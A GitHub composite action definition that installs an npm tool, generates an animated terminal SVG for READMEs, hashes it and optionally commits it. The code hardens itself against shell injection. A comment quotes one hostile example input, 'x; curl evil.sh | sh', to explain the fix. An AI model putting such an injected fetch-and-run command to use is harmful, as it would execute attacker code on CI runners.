name: 'SVG Terminal Generator'
description: 'Generate animated SVG terminals for GitHub READMEs from a declarative YAML config.'
author: 'williamzujkowski'

branding:
  icon: 'terminal'
  color: 'purple'

inputs:
  config:
    description: 'Path to terminal.yml config file'
    required: false
    default: 'terminal.yml'
  output:
    description: 'Output SVG file path'
    required: false
    default: 'terminal.svg'
  cache-mode:
    description: 'Dynamic-block cache behavior: normal | refresh | frozen | off'
    required: false
    default: 'normal'
  static:
    description: 'Generate a non-animated SVG (final-frame snapshot)'
    required: false
    default: 'false'
  minify:
    description: 'Strip inter-element whitespace from the output'
    required: false
    default: 'false'
  commit:
    description: 'Auto-commit the generated SVG'
    required: false
    default: 'false'
  commit-message:
    description: 'Commit message when auto-committing'
    required: false
    default: 'chore: update terminal SVG [skip ci]'

outputs:
  svg-path:
    description: 'Path to the generated SVG file'
    value: ${{ inputs.output }}
  svg-size:
    description: 'Size of the generated SVG in bytes (also: svg-bytes — same value)'
    value: ${{ steps.generate.outputs.size }}
  svg-bytes:
    description: 'Byte count of the generated SVG (integer string)'
    value: ${{ steps.generate.outputs.size }}
  svg-sha256:
    description: 'Hex SHA-256 of the generated SVG, for cache-busting downstream'
    value: ${{ steps.generate.outputs.sha256 }}
  svg-changed:
    description: 'true | false — did this run modify a pre-existing SVG? false on first run (no prior file) and false when bytes match. Use to gate commits.'
    value: ${{ steps.generate.outputs.changed }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0 (SHA-pinned per #114 L1)
      with:
        node-version: '22'
        cache: 'npm'

    - name: Install svg-terminal
      shell: bash
      # Pin to the npm-published version that matches this action's release —
      # users who pin the action by SHA / tag get reproducible behavior
      # instead of whatever floats on the npm registry. Bumped each action
      # release to match the published npm version.
      run: npm install -g svg-terminal@1.2.0

    - name: Generate SVG
      id: generate
      shell: bash
      env:
        # Pass user inputs via env so they never go through shell template
        # expansion (closes M1 — without this, a value like
        # `config: 'x; curl evil.sh | sh'` would execute on the runner).
        TZ: ${{ env.TZ || 'UTC' }}
        INPUT_CONFIG: ${{ inputs.config }}
        INPUT_OUTPUT: ${{ inputs.output }}
        INPUT_CACHE_MODE: ${{ inputs.cache-mode }}
        INPUT_STATIC: ${{ inputs.static }}
        INPUT_MINIFY: ${{ inputs.minify }}
      run: |
        set -euo pipefail
        # Compose the optional flags into a single $args string. Empty by default;
        # only adds the flag when the input was set to a non-default value.
        args=""
        case "$INPUT_CACHE_MODE" in
          refresh) args="$args --refresh-cache" ;;
          frozen)  args="$args --frozen-cache" ;;
          off)     args="$args --no-cache" ;;
          normal|"") : ;;
          *) echo "::error::Unknown cache-mode '$INPUT_CACHE_MODE'"; exit 1 ;;
        esac
        if [ "$INPUT_STATIC" = "true" ]; then args="$args --static"; fi
        if [ "$INPUT_MINIFY" = "true" ]; then args="$args --minify"; fi
        # Capture pre-existing SVG content (if any) so we can compute svg-changed.
        prev_sha=""
        if [ -f "$INPUT_OUTPUT" ]; then
          prev_sha=$(sha256sum "$INPUT_OUTPUT" | cut -d' ' -f1)
        fi
        svg-terminal generate --config "$INPUT_CONFIG" --output "$INPUT_OUTPUT" $args
        new_sha=$(sha256sum "$INPUT_OUTPUT" | cut -d' ' -f1)
        bytes=$(stat -c%s "$INPUT_OUTPUT" 2>/dev/null || stat -f%z "$INPUT_OUTPUT")
        # changed semantics (round-4 L1 fix): "did this run modify a
        # pre-existing committed SVG?". First-ever run has no prev_sha →
        # treat as 'false' (workflow can branch on `changed=true` to gate
        # commits without firing on the bootstrap).
        if [ -z "$prev_sha" ]; then
          changed="false"
        elif [ "$prev_sha" = "$new_sha" ]; then
          changed="false"
        else
          changed="true"
        fi
        {
          echo "size=$bytes"
          echo "sha256=$new_sha"
          echo "changed=$changed"
        } >> "$GITHUB_OUTPUT"

    - name: Commit SVG
      # Only when both: caller opted into commit AND we actually changed bytes.
      # Skipping on first run / no-op runs avoids "nothing to commit" noise.
      if: inputs.commit == 'true' && steps.generate.outputs.changed == 'true'
      shell: bash
      env:
        INPUT_OUTPUT: ${{ inputs.output }}
        INPUT_COMMIT_MESSAGE: ${{ inputs.commit-message }}
      run: |
        # Inputs passed via env so commit-message can never break out of the
        # `git commit -m "..."` quoting (closes M1 from the v0.17.0 audit).
        set -euo pipefail
        git config --local user.email "github-actions[bot]@users.noreply.github.com"
        git config --local user.name "github-actions[bot]"
        git add "$INPUT_OUTPUT"
        git diff --staged --quiet && exit 0  # nothing to commit
        git commit -m "$INPUT_COMMIT_MESSAGE"
        # Explicit refspec — round-4 M2 fix. Bare `git push` errors with
        # "src refspec HEAD does not match any" on the detached-HEAD checkout
        # that pull_request triggers produce. GITHUB_REF_NAME is set to the
        # branch name for push/schedule/workflow_dispatch events; on
        # pull_request it'd be the PR ref (refs/pull/N/merge) which is
        # read-only — those should not be using commit: true anyway.
        if [ -z "${GITHUB_REF_NAME:-}" ]; then
          echo "::error::commit: true requires GITHUB_REF_NAME (use on: push / schedule / workflow_dispatch — not pull_request)"
          exit 1
        fi
        git push origin "HEAD:${GITHUB_REF_NAME}"
